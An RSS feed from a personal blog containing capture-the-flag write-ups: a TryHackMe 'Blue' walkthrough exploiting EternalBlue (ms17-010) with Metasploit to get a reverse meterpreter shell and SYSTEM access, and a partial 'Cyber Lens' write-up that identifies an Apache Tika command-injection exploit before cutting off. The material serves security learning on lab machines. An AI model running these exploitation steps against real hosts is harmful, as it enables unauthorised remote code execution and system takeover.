<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <atom:link href="https://benwick921.github.io/feed.xml" rel="self" type="application/rss+xml" />
    <title>Your Site Name</title>
    <link>https://benwick921.github.io</link>
    <description>Latest content from Your Site Name</description>
    <language>en-us</language>
    <lastBuildDate>Thu, 27 Mar 2025 00:35:02 GMT</lastBuildDate>
    <author>
      <name>Benwick</name>
    </author>

    
      <item>
        <title>Blue</title>
        <link href="https://benwick921.github.io/cyber/writeup/blue/" rel="alternate" type="text/html" title="Blue"/>
        <guid>https://benwick921.github.io/cyber/writeup/blue/</guid>
        <pubDate>Thu, 27 Mar 2025 00:35:02 GMT</pubDate>
        <lastBuildDate>Thu, 27 Mar 2025 00:35:02 GMT</lastBuildDate> 
        <content type="html" xml:base="Thu, 27 Mar 2025 00:35:02 GMT">&lt;img src=&quot;/cyber/writeup/blue/banner.gif&quot; alt=&quot;&quot;&gt;&lt;p&gt;&lt;pre&gt;# Nmap 7.94SVN scan initiated Fri Mar 14 20:07:43 2025 as: nmap -sC -sV -oN nmap 10.10.22.152&lt;br&gt;Nmap scan report for 10.10.22.152&lt;br&gt;Host is up (0.033s latency).&lt;br&gt;Not shown: 991 closed tcp ports (conn-refused)&lt;br&gt;PORT      STATE SERVICE            VERSION&lt;br&gt;135/tcp   open  msrpc              Microsoft Windows RPC&lt;br&gt;139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn&lt;br&gt;445/tcp   open  microsoft-ds       Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)&lt;br&gt;3389/tcp  open  ssl/ms-wbt-server?&lt;br&gt;| rdp-ntlm-info: &lt;br&gt;|   Target_Name: JON-PC&lt;br&gt;|   NetBIOS_Domain_Name: JON-PC&lt;br&gt;|   NetBIOS_Computer_Name: JON-PC&lt;br&gt;|   DNS_Domain_Name: Jon-PC&lt;br&gt;|   DNS_Computer_Name: Jon-PC&lt;br&gt;|   Product_Version: 6.1.7601&lt;br&gt;|_  System_Time: 2025-03-15T00:09:08+00:00&lt;br&gt;|_ssl-date: 2025-03-15T00:09:13+00:00; -1s from scanner time.&lt;br&gt;| ssl-cert: Subject: commonName=Jon-PC&lt;br&gt;| Not valid before: 2025-03-14T00:07:24&lt;br&gt;|_Not valid after:  2025-09-13T00:07:24&lt;br&gt;49152/tcp open  msrpc              Microsoft Windows RPC&lt;br&gt;49153/tcp open  msrpc              Microsoft Windows RPC&lt;br&gt;49154/tcp open  msrpc              Microsoft Windows RPC&lt;br&gt;49158/tcp open  msrpc              Microsoft Windows RPC&lt;br&gt;49159/tcp open  msrpc              Microsoft Windows RPC&lt;br&gt;Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows&lt;br&gt;&lt;br&gt;Host script results:&lt;br&gt;|_nbstat: NetBIOS name: JON-PC, NetBIOS user: &amp;lt;unknown&amp;gt;, NetBIOS MAC: 02:ea:88:94:7d:bf (unknown)&lt;br&gt;| smb-security-mode: &lt;br&gt;|   account_used: guest&lt;br&gt;|   authentication_level: user&lt;br&gt;|   challenge_response: supported&lt;br&gt;|_  message_signing: disabled (dangerous, but default)&lt;br&gt;| smb2-time: &lt;br&gt;|   date: 2025-03-15T00:09:08&lt;br&gt;|_  start_date: 2025-03-15T00:07:22&lt;br&gt;| smb-os-discovery: &lt;br&gt;|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)&lt;br&gt;|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional&lt;br&gt;|   Computer name: Jon-PC&lt;br&gt;|   NetBIOS computer name: JON-PC\x00&lt;br&gt;|   Workgroup: WORKGROUP\x00&lt;br&gt;|_  System time: 2025-03-14T19:09:08-05:00&lt;br&gt;|_clock-skew: mean: 59m59s, deviation: 2h14m10s, median: 0s&lt;br&gt;| smb2-security-mode: &lt;br&gt;|   2:1:0: &lt;br&gt;|_    Message signing enabled but not required&lt;br&gt;&lt;br&gt;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .&lt;br&gt;# Nmap done at Fri Mar 14 20:09:14 2025 -- 1 IP address (1 host up) scanned in 90.66 seconds&lt;br&gt;&lt;/pre&gt;&lt;/p&gt;&lt;p&gt;I have 9 open ports: 135 msrpc, 139 netbios-ssn, 445 microsoft-ds, 3389 ssl/ms-wbt-server?, 49152 msrpc, 49153 msrpc, 49154 msrpc, 49158 msrpc, and 49159 msrpc. These ports are common to find open in a Windows system.&lt;/p&gt;&lt;p&gt;From this Nmap scan, I can see the operating system version, which is a Windows 7 Pro Service pack 1 and the SMB v1. To find out that the SMB is version 1 there are a few indicators that confirm such:&lt;/p&gt;&lt;p&gt;&lt;ol&gt;&lt;li&gt;&lt;b&gt;Presence of Ports 139 and 445&lt;/b&gt;&lt;/li&gt;&lt;ul&gt;&lt;li&gt;Port 139 (NetBIOS-SSN): Used by SMB over NetBIOS, typically associated with SMBv1.&lt;/li&gt;&lt;li&gt;Port 445 (Microsoft-DS): Used by SMB directly over TCP without NetBIOS.&lt;/li&gt;&lt;/ul&gt;&lt;li&gt;&lt;b&gt;Lack of SMBv2 Protocol Details&lt;/b&gt;&lt;/li&gt;&lt;ul&gt;&lt;li&gt;asdaThe scan does not list SMBv2 explicitly. If SMBv2 or SMBv3 were enforced, you would see more details under &lt;code&gt;smb2-security-mode&lt;/code&gt; and &lt;code&gt;smb2-time&lt;/code&gt;.&lt;/li&gt;&lt;/ul&gt;&lt;li&gt;&lt;b&gt;SMB Message Signing is Disabled&lt;/b&gt;&lt;/li&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;message_signing: disabled&lt;/code&gt; appears in the &lt;code&gt;smb-security-mode&lt;/code&gt; script output.&lt;/li&gt;&lt;li&gt;While message signing is optional in SMBv2, it&apos;s typically disabled in SMBv1 by default, making it a common indicator of SMBv1 being enabled.&lt;/li&gt;&lt;/ul&gt;&lt;li&gt;&lt;b&gt;Windows Version (Windows 7 SP1)&lt;/b&gt;&lt;/li&gt;&lt;ul&gt;&lt;li&gt;Windows 7 (especially without modern patches) still supports SMBv1 by default.&lt;/li&gt;&lt;li&gt;Since the scan identifies Windows 7 Professional 7601 Service Pack 1, it&apos;s likely that SMBv1 is still enabled unless explicitly disabled by the administrator.&lt;/li&gt;&lt;/ul&gt;&lt;li&gt;&lt;b&gt;No SMBv2 Negotiation Detected&lt;/b&gt;&lt;/li&gt;&lt;ul&gt;&lt;li&gt;The smb2-security-mode script output only shows:&lt;pre&gt;| smb2-security-mode: &lt;br&gt;|   2:1:0: &lt;br&gt;|_    Message signing enabled but not required&lt;/pre&gt;&lt;/li&gt;&lt;li&gt;If SMBv1 were fully disabled, you would typically see more details about SMBv2/SMBv3 negotiation.&lt;/li&gt;&lt;/ul&gt;&lt;/ol&gt;&lt;/p&gt;&lt;p&gt;So these are the indications of an Eternal Blue vulnerability. To further confirm the presence of such vulnerability I run a vulnerability scan with Nmap &lt;code&gt;nmap --script=*vuln* 10.10.22.152&lt;/code&gt; where &lt;code&gt;*vuln*&lt;/code&gt; means run every script that contains the substring &quot;vuln&quot; in the name. In this way, I don&apos;t have to specify all the scripts manually or run one-by-one scripts for vulnerability scans.&lt;/p&gt;&lt;p&gt;&lt;pre&gt;# Nmap 7.94SVN scan initiated Fri Mar 14 20:11:55 2025 as: nmap --script=*vuln* -oN vuln-scan 10.10.22.152&lt;br&gt;Nmap scan report for 10.10.22.152&lt;br&gt;Host is up (0.030s latency).&lt;br&gt;Not shown: 991 closed tcp ports (conn-refused)&lt;br&gt;PORT      STATE SERVICE&lt;br&gt;135//tcp   open  msrpc&lt;br&gt;139//tcp   open  netbios-ssn&lt;br&gt;445//tcp   open  microsoft-ds&lt;br&gt;3389//tcp  open  ms-wbt-server&lt;br&gt;49152//tcp open  unknown&lt;br&gt;49153//tcp open  unknown&lt;br&gt;49154//tcp open  unknown&lt;br&gt;49158//tcp open  unknown&lt;br&gt;49159//tcp open  unknown&lt;br&gt;&lt;br&gt;Host script results:&lt;br&gt;|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED&lt;br&gt;| smb-vuln-ms17-010: &lt;br&gt;|   VULNERABLE:&lt;br&gt;|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)&lt;br&gt;|     State: VULNERABLE&lt;br&gt;|     IDs:  CVE:CVE-2017-0143&lt;br&gt;|     Risk factor: HIGH&lt;br&gt;|       A critical remote code execution vulnerability exists in Microsoft SMBv1&lt;br&gt;|        servers (ms17-010).&lt;br&gt;|           &lt;br&gt;|     Disclosure date: 2017-03-14&lt;br&gt;|     References:&lt;br&gt;|       https:////blogs.technet.microsoft.com//msrc//2017//05//12//customer-guidance-for-wannacrypt-attacks//&lt;br&gt;|       https:////cve.mitre.org//cgi-bin//cvename.cgi?name=CVE-2017-0143&lt;br&gt;|_      https:////technet.microsoft.com//en-us//library//security//ms17-010.aspx&lt;br&gt;|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED&lt;br&gt;|_smb-vuln-ms10-054: false&lt;br&gt;&lt;br&gt;# Nmap done at Fri Mar 14 20:13:22 2025 -- 1 IP address (1 host up) scanned in 87.08 seconds&lt;br&gt;&lt;/pre&gt;&lt;/p&gt;&lt;p&gt;Nmap also confirms the presense of the vulnerability Eternal Blue which is also indicated as ms17-010 or CVE-2017-0143.&lt;/p&gt;&lt;p&gt;To exploit this vulnerability I will use Metasploit (&lt;code&gt;msfconsole&lt;/code&gt;) and search for Eternal Blue.&lt;/p&gt;&lt;p&gt;&lt;pre&gt;$ msfconsole&lt;br&gt;Metasploit tip: View all productivity tips with the tips command&lt;br&gt;                                                  &lt;br&gt;# cowsay++&lt;br&gt; ____________&lt;br&gt;&amp;lt; metasploit &amp;gt;&lt;br&gt; ------------&lt;br&gt;       \   ,__,&lt;br&gt;        \  (oo)____&lt;br&gt;           (__)    )\&lt;br&gt;              ||--|| *&lt;br&gt;&lt;br&gt;&lt;br&gt;       =[ metasploit v6.4.18-dev                          ]&lt;br&gt;+ -- --=[ 2437 exploits - 1255 auxiliary - 429 post       ]&lt;br&gt;+ -- --=[ 1471 payloads - 47 encoders - 11 nops           ]&lt;br&gt;+ -- --=[ 9 evasion                                       ]&lt;br&gt;&lt;br&gt;Metasploit Documentation: https://docs.metasploit.com/&lt;br&gt;&lt;br&gt;msf6 &amp;gt; search Eternal Blue&lt;br&gt;&lt;br&gt;Matching Modules&lt;br&gt;================&lt;br&gt;&lt;br&gt;   #   Name                                           Disclosure Date  Rank     Check  Description&lt;br&gt;   -   ----                                           ---------------  ----     -----  -----------&lt;br&gt;   0   exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption&lt;br&gt;   1     \_ target: Automatic Target                  .                .        .      .&lt;br&gt;   2     \_ target: Windows 7                         .                .        .      .&lt;br&gt;   3     \_ target: Windows Embedded Standard 7       .                .        .      .&lt;br&gt;   4     \_ target: Windows Server 2008 R2            .                .        .      .&lt;br&gt;   5     \_ target: Windows 8                         .                .        .      .&lt;br&gt;   6     \_ target: Windows 8.1                       .                .        .      .&lt;br&gt;   7     \_ target: Windows Server 2012               .                .        .      .&lt;br&gt;   8     \_ target: Windows 10 Pro                    .                .        .      .&lt;br&gt;   9     \_ target: Windows 10 Enterprise Evaluation  .                .        .      .&lt;br&gt;   10  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution&lt;br&gt;   11    \_ target: Automatic                         .                .        .      .&lt;br&gt;   12    \_ target: PowerShell                        .                .        .      .&lt;br&gt;   13    \_ target: Native upload                     .                .        .      .&lt;br&gt;   14    \_ target: MOF upload                        .                .        .      .&lt;br&gt;   15    \_ AKA: ETERNALSYNERGY                       .                .        .      .&lt;br&gt;   16    \_ AKA: ETERNALROMANCE                       .                .        .      .&lt;br&gt;   17    \_ AKA: ETERNALCHAMPION                      .                .        .      .&lt;br&gt;   18    \_ AKA: ETERNALBLUE                          .                .        .      .&lt;br&gt;   19  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution&lt;br&gt;   20    \_ AKA: ETERNALSYNERGY                       .                .        .      .&lt;br&gt;   21    \_ AKA: ETERNALROMANCE                       .                .        .      .&lt;br&gt;   22    \_ AKA: ETERNALCHAMPION                      .                .        .      .&lt;br&gt;   23    \_ AKA: ETERNALBLUE                          .                .        .      .&lt;br&gt;   24  auxiliary/scanner/smb/smb_ms17_010             .                normal   No     MS17-010 SMB RCE Detection&lt;br&gt;   25    \_ AKA: DOUBLEPULSAR                         .                .        .      .&lt;br&gt;   26    \_ AKA: ETERNALBLUE                          .                .        .      .&lt;br&gt;   27  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution&lt;br&gt;   28    \_ target: Execute payload (x64)             .                .        .      .&lt;br&gt;   29    \_ target: Neutralize implant                .                .        .      .&lt;br&gt;&lt;br&gt;&lt;br&gt;Interact with a module by name or index. For example info 29, use 29 or use exploit/windows/smb/smb_doublepulsar_rce&lt;br&gt;After interacting with a module you can manually set a TARGET with set TARGET &apos;Neutralize implant&apos;&lt;br&gt;&lt;br&gt;msf6 &amp;gt;&lt;/pre&gt;&lt;/p&gt;&lt;p&gt;Now I can select the first exploit hoping it works, if not I will try each. After choosing the exploit I have to check the available options and set them.&lt;/p&gt;&lt;p&gt;&lt;pre&gt;msf6 &amp;gt; use 0&lt;br&gt;[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp&lt;br&gt;msf6 exploit(windows/smb/ms17_010_eternalblue) &amp;gt; show options&lt;br&gt;&lt;br&gt;Module options (exploit/windows/smb/ms17_010_eternalblue):&lt;br&gt;&lt;br&gt;   Name           Current Setting  Required  Description&lt;br&gt;   ----           ---------------  --------  -----------&lt;br&gt;   RHOSTS                          yes       The target host(s), see https://docs.metasploit.com/docs/using-metaspl&lt;br&gt;                                             oit/basics/using-metasploit.html&lt;br&gt;   RPORT          445              yes       The target port (TCP)&lt;br&gt;   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects&lt;br&gt;                                             Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target&lt;br&gt;                                             machines.&lt;br&gt;   SMBPass                         no        (Optional) The password for the specified username&lt;br&gt;   SMBUser                         no        (Optional) The username to authenticate as&lt;br&gt;   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Wind&lt;br&gt;                                             ows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target mach&lt;br&gt;                                             ines.&lt;br&gt;   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server&lt;br&gt;                                              2008 R2, Windows 7, Windows Embedded Standard 7 target machines.&lt;br&gt;&lt;br&gt;&lt;br&gt;Payload options (windows/x64/meterpreter/reverse_tcp):&lt;br&gt;&lt;br&gt;   Name      Current Setting  Required  Description&lt;br&gt;   ----      ---------------  --------  -----------&lt;br&gt;   EXITFUNC  thread           yes       Exit technique (Accepted: &apos;&apos;, seh, thread, process, none)&lt;br&gt;   LHOST     192.168.135.128  yes       The listen address (an interface may be specified)&lt;br&gt;   LPORT     4444             yes       The listen port&lt;br&gt;&lt;br&gt;&lt;br&gt;Exploit target:&lt;br&gt;&lt;br&gt;   Id  Name&lt;br&gt;   --  ----&lt;br&gt;   0   Automatic Target&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;View the full module info with the info, or info -d command.&lt;br&gt;&lt;br&gt;msf6 exploit(windows/smb/ms17_010_eternalblue) &amp;gt; set RHOSTS 10.10.232.74&lt;br&gt;RHOSTS =&amp;gt; 10.10.232.74&lt;br&gt;msf6 exploit(windows/smb/ms17_010_eternalblue) &amp;gt; set LHOST 10.21.112.161&lt;br&gt;LHOST =&amp;gt; 10.21.112.161&lt;br&gt;msf6 exploit(windows/smb/ms17_010_eternalblue) &amp;gt; show options&lt;br&gt;&lt;br&gt;Module options (exploit/windows/smb/ms17_010_eternalblue):&lt;br&gt;&lt;br&gt;   Name           Current Setting  Required  Description&lt;br&gt;   ----           ---------------  --------  -----------&lt;br&gt;   RHOSTS         10.10.232.74     yes       The target host(s), see https://docs.metasploit.com/docs/using-metaspl&lt;br&gt;                                             oit/basics/using-metasploit.html&lt;br&gt;   RPORT          445              yes       The target port (TCP)&lt;br&gt;   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects&lt;br&gt;                                             Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target&lt;br&gt;                                             machines.&lt;br&gt;   SMBPass                         no        (Optional) The password for the specified username&lt;br&gt;   SMBUser                         no        (Optional) The username to authenticate as&lt;br&gt;   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Wind&lt;br&gt;                                             ows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target mach&lt;br&gt;                                             ines.&lt;br&gt;   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server&lt;br&gt;                                              2008 R2, Windows 7, Windows Embedded Standard 7 target machines.&lt;br&gt;&lt;br&gt;&lt;br&gt;Payload options (windows/x64/meterpreter/reverse_tcp):&lt;br&gt;&lt;br&gt;   Name      Current Setting  Required  Description&lt;br&gt;   ----      ---------------  --------  -----------&lt;br&gt;   EXITFUNC  thread           yes       Exit technique (Accepted: &apos;&apos;, seh, thread, process, none)&lt;br&gt;   LHOST     10.21.112.161    yes       The listen address (an interface may be specified)&lt;br&gt;   LPORT     4444             yes       The listen port&lt;br&gt;&lt;br&gt;&lt;br&gt;Exploit target:&lt;br&gt;&lt;br&gt;   Id  Name&lt;br&gt;   --  ----&lt;br&gt;   0   Automatic Target&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;View the full module info with the info, or info -d command.&lt;br&gt;&lt;br&gt;msf6 exploit(windows/smb/ms17_010_eternalblue) &amp;gt;&lt;/pre&gt;&lt;/p&gt;&lt;p&gt;The only thing that remains now is to exploit it!&lt;/p&gt;&lt;p&gt;&lt;pre&gt;msf6 exploit(windows/smb/ms17_010_eternalblue) &amp;gt; exploit&lt;br&gt;&lt;br&gt;[*] Started reverse TCP handler on 10.21.112.161:4444 &lt;br&gt;[*] 10.10.232.74:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check&lt;br&gt;[+] 10.10.232.74:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)&lt;br&gt;[*] 10.10.232.74:445      - Scanned 1 of 1 hosts (100% complete)&lt;br&gt;[+] 10.10.232.74:445 - The target is vulnerable.&lt;br&gt;[*] 10.10.232.74:445 - Connecting to target for exploitation.&lt;br&gt;[+] 10.10.232.74:445 - Connection established for exploitation.&lt;br&gt;[+] 10.10.232.74:445 - Target OS selected valid for OS indicated by SMB reply&lt;br&gt;[*] 10.10.232.74:445 - CORE raw buffer dump (42 bytes)&lt;br&gt;[*] 10.10.232.74:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes&lt;br&gt;[*] 10.10.232.74:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv&lt;br&gt;[*] 10.10.232.74:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      &lt;br&gt;[+] 10.10.232.74:445 - Target arch selected valid for arch indicated by DCE/RPC reply&lt;br&gt;[*] 10.10.232.74:445 - Trying exploit with 12 Groom Allocations.&lt;br&gt;[*] 10.10.232.74:445 - Sending all but last fragment of exploit packet&lt;br&gt;[*] 10.10.232.74:445 - Starting non-paged pool grooming&lt;br&gt;[+] 10.10.232.74:445 - Sending SMBv2 buffers&lt;br&gt;[+] 10.10.232.74:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.&lt;br&gt;[*] 10.10.232.74:445 - Sending final SMBv2 buffers.&lt;br&gt;[*] 10.10.232.74:445 - Sending last fragment of exploit packet!&lt;br&gt;[*] 10.10.232.74:445 - Receiving response from exploit packet&lt;br&gt;[+] 10.10.232.74:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!&lt;br&gt;[*] 10.10.232.74:445 - Sending egg to corrupted connection.&lt;br&gt;[*] 10.10.232.74:445 - Triggering free of corrupted buffer.&lt;br&gt;[*] Sending stage (201798 bytes) to 10.10.232.74&lt;br&gt;[*] Meterpreter session 1 opened (10.21.112.161:4444 -&amp;gt; 10.10.232.74:49194) at 2025-03-17 19:25:08 -0400&lt;br&gt;[+] 10.10.232.74:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=&lt;br&gt;[+] 10.10.232.74:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=&lt;br&gt;[+] 10.10.232.74:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=&lt;br&gt;&lt;br&gt;meterpreter &amp;gt;&lt;/pre&gt;&lt;/p&gt;&lt;p&gt;To get the shell I can simply run the command &lt;code&gt;shell&lt;/code&gt;.&lt;/p&gt;&lt;p&gt;&lt;pre&gt;meterpreter &amp;gt;   shell&lt;br&gt;Process 1520 created.&lt;br&gt;Channel 1 created.&lt;br&gt;Microsoft Windows [Version 6.1.7601]&lt;br&gt;Copyright (c) 2009 Microsoft Corporation.  All rights reserved.&lt;br&gt;&lt;br&gt;C:\Windows\system32&amp;gt;whoami&lt;br&gt;whoami&lt;br&gt;nt authority\system&lt;/pre&gt;&lt;/p&gt;&lt;p&gt;At this point, you can search the system for the flags in the time needed.&lt;/p&gt;</content>
        
          <category term="easy"/>
        
          <category term="ctf"/>
        
          <category term="box"/>
        
          <category term="thm"/>
        
          <category term="cve"/>
        
          <category term="eternal blue"/>
        
          <category term="ms17-010"/>
        
          <category term="rce"/>
        
          <category term="windows"/>
        
          <category term="metasploit"/>
        
          <category term="smb"/>
        
          <category term="ejpt"/>
        
          <category term="oscp"/>
        
      </item>
    
      <item>
        <title>Cyber Lens</title>
        <link href="https://benwick921.github.io/cyber/writeup/cyber-lens/" rel="alternate" type="text/html" title="Cyber Lens"/>
        <guid>https://benwick921.github.io/cyber/writeup/cyber-lens/</guid>
        <pubDate>Thu, 27 Mar 2025 00:35:02 GMT</pubDate>
        <lastBuildDate>Thu, 27 Mar 2025 00:35:02 GMT</lastBuildDate> 
        <content type="html" xml:base="Thu, 27 Mar 2025 00:35:02 GMT">&lt;img src=&quot;/cyber/writeup/cyberlens/banner.gif&quot; alt=&quot;&quot;&gt;&lt;p&gt;&lt;pre&gt;# Nmap 7.94SVN scan initiated Mon Feb 17 08:13:49 2025 as: nmap -sC -sV -oN nmap 10.10.182.183&lt;br&gt;Nmap scan report for cyberlens.thm (10.10.182.183)&lt;br&gt;Host is up (0.051s latency).&lt;br&gt;Not shown: 995 closed tcp ports (conn-refused)&lt;br&gt;PORT     STATE SERVICE       VERSION&lt;br&gt;80/tcp   open  http          Apache httpd 2.4.57 ((Win64))&lt;br&gt;|_http-server-header: Apache/2.4.57 (Win64)&lt;br&gt;| http-methods: &lt;br&gt;|_  Potentially risky methods: TRACE&lt;br&gt;|_http-title: CyberLens: Unveiling the Hidden Matrix&lt;br&gt;135/tcp  open  msrpc         Microsoft Windows RPC&lt;br&gt;139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn&lt;br&gt;445/tcp  open  microsoft-ds?&lt;br&gt;3389/tcp open  ms-wbt-server Microsoft Terminal Services&lt;br&gt;| rdp-ntlm-info: &lt;br&gt;|   Target_Name: CYBERLENS&lt;br&gt;|   NetBIOS_Domain_Name: CYBERLENS&lt;br&gt;|   NetBIOS_Computer_Name: CYBERLENS&lt;br&gt;|   DNS_Domain_Name: CyberLens&lt;br&gt;|   DNS_Computer_Name: CyberLens&lt;br&gt;|   Product_Version: 10.0.17763&lt;br&gt;|_  System_Time: 2025-02-17T13:14:12+00:00&lt;br&gt;| ssl-cert: Subject: commonName=CyberLens&lt;br&gt;| Not valid before: 2025-02-16T12:31:00&lt;br&gt;|_Not valid after:  2025-08-18T12:31:00&lt;br&gt;|_ssl-date: 2025-02-17T13:14:23+00:00; 0s from scanner time.&lt;br&gt;Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows&lt;br&gt;&lt;br&gt;Host script results:&lt;br&gt;| smb2-security-mode: &lt;br&gt;|   3:1:1: &lt;br&gt;|_    Message signing enabled but not required&lt;br&gt;| smb2-time: &lt;br&gt;|   date: 2025-02-17T13:14:14&lt;br&gt;|_  start_date: N/A&lt;br&gt;&lt;br&gt;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .&lt;br&gt;# Nmap done at Mon Feb 17 08:14:24 2025 -- 1 IP address (1 host up) scanned in 34.99 seconds&lt;/pre&gt;&lt;/p&gt;&lt;p&gt;I have 5 ports: 80 http, 135 msrpc, 139 netbios-ssn, 445 microsoft-ds? and 3389 ms-wbt-server.&lt;/p&gt;&lt;p&gt;Now during the challenge, I did not know much about the Windows environment and with the help of ChatGPT I searched and learned each of the ports I did not know about because each of them could be an attack vector or be used during the exploitation process in a way or another.&lt;/p&gt;&lt;p&gt;I started my enumeration process with the website, and it seems pretty basic with a functionality to extract metadata from an uploaded image.&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/cyberlens/websitehome1.PNG&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/cyberlens/websitehome2.PNG&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;The next thing is to upload a random image and see how the function extracts the metadata. The function generated a long output but nothing interesting in the image metadata as I uploaded a random image.&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/cyberlens/metadata.PNG&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;Now I want to understand how the function works starting looking for the function from the source code.&lt;/p&gt;&lt;p&gt;Analyzing the page source I can clearly see the script and the endpoint it is contacting to examine the image metadata.&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/cyberlens/script.PNG&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;&lt;pre&gt;document.addEventListener(&quot;DOMContentLoaded&quot;, function() {&lt;br&gt;  document.getElementById(&quot;metadataButton&quot;).addEventListener(&quot;click&quot;, function() {&lt;br&gt;    var fileInput = document.getElementById(&quot;imageFileInput&quot;);&lt;br&gt;    var file = fileInput.files[0];&lt;br&gt;&lt;br&gt;    var reader = new FileReader();&lt;br&gt;    reader.onload = function() {&lt;br&gt;      var fileData = reader.result;&lt;br&gt;&lt;br&gt;      fetch(&quot;http://cyberlens.thm:61777/meta&quot;, {&lt;br&gt;        method: &quot;PUT&quot;,&lt;br&gt;        body: fileData,&lt;br&gt;        headers: {&lt;br&gt;          &quot;Accept&quot;: &quot;application/json&quot;,&lt;br&gt;          &quot;Content-Type&quot;: &quot;application/octet-stream&quot;&lt;br&gt;        }&lt;br&gt;      })&lt;br&gt;      .then(response =&gt; {&lt;br&gt;        if (response.ok) {&lt;br&gt;          return response.json();&lt;br&gt;        } else {&lt;br&gt;          throw new Error(&quot;Error: &quot; + response.status);&lt;br&gt;        }&lt;br&gt;      })&lt;br&gt;      .then(data =&gt; {&lt;br&gt;        var metadataOutput = document.getElementById(&quot;metadataOutput&quot;);&lt;br&gt;        metadataOutput.innerText = JSON.stringify(data, null, 2);&lt;br&gt;      })&lt;br&gt;      .catch(error =&gt; {&lt;br&gt;        console.error(&quot;Error:&quot;, error);&lt;br&gt;      });&lt;br&gt;    };&lt;br&gt;&lt;br&gt;    reader.readAsArrayBuffer(file);&lt;br&gt;  });&lt;br&gt;});&lt;/pre&gt;&lt;/p&gt;The endpoint is &lt;code&gt;http://cyberlens.thm:61777/&lt;/code&gt; and to access this endpoint I have to update my &lt;code&gt;/etc/hosts&lt;/code&gt; file.&lt;p&gt;&lt;pre&gt;127.0.0.1      localhost&lt;br&gt;127.0.1.1      kali&lt;br&gt;10.10.158.180  cyberlens.thm&lt;br&gt;# The following lines are desirable for IPv6 capable hosts&lt;br&gt;::1     localhost ip6-localhost ip6-loopback&lt;br&gt;ff02::1 ip6-allnodes&lt;br&gt;ff02::2 ip6-allrouters&lt;/pre&gt;&lt;/p&gt;&lt;p&gt;By visiting the URL I can see all the methods, the server name and the version. &lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/cyberlens/apachetika.PNG&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;By searching the server name and the version in searchsploit a CVE pops up.&lt;/p&gt;&lt;p&gt;&lt;pre&gt;$ searchsploit apache tika 1.17&lt;br&gt;----------------------------------------------------------------------------------- ---------------------------------&lt;br&gt; Exploit Title                                                                     |  Path&lt;br&gt;----------------------------------------------------------------------------------- ---------------------------------&lt;br&gt;Apache Tika 1.15 - 1.17 - Header Command Injection (Metasploit)                    | windows/remote/47208.rb&lt;br&gt;Apache Tika-server &lt; 1.18 - Command Injection                                      | windows/remote/46540.py&lt;br&gt;----------------------------------------------------------------------------------- ---------------------------------&lt;br&gt;Shellcodes: No Results&lt;/pre&gt;&lt;/p&gt;&lt;p&gt;Here my first choice is the &lt;b&gt;46540.py&lt;/b&gt; because it is Python and it is not a Metasploit module meaning I can use it almost out of the box.&lt;/p&gt;&lt;p&gt;&lt;pre 